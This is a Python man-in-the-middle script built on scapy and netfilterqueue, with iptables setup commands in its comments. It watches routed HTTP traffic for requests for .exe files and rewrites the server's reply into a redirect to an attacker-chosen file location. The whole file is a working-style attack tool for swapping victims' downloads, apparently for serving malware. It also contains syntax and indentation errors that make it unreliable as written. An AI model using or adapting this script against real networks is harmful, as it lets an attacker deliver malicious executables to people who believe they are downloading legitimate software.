#!/usr/bin/env python

#must run iptables -I INPUT -j NFQUEUE --queue-num 0 (use for packets whose destination is your computer)
#must run iptables -I OUTPUT -j NFQUEUE --queue-num 0 (use for packets whose source is your computer)
#>> must run iptables -I FORWARD -j NFQUEUE --queue-num 0 (use for packets being routed through your computer)
#>> in terminal: echo 1 > /proc/sys/net/ipv4/ip_forward
#can clear with iptables --flush

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print(".exe request detected!")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("Replacing .exe file")
                modified_packet = set_load(scapy_packet, scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.com\n") #edit location of alternate file here
                packet.set_payload(str(modified_packet))
    
    packet.accept() #let packet out of queue
    
queue.netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()    